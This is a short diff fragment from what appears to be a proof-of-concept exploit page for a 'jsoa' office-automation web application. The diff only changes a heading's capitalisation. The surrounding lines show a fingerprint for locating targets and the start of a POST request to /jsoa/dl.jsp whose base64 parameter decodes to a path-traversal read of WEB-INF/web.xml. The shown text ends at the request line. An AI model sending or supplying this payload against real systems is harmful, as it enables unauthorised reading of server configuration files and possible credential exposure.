@@ -8,7 +8,7 @@
 body="/jsoa/login.jsp"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h HTTP/1.1
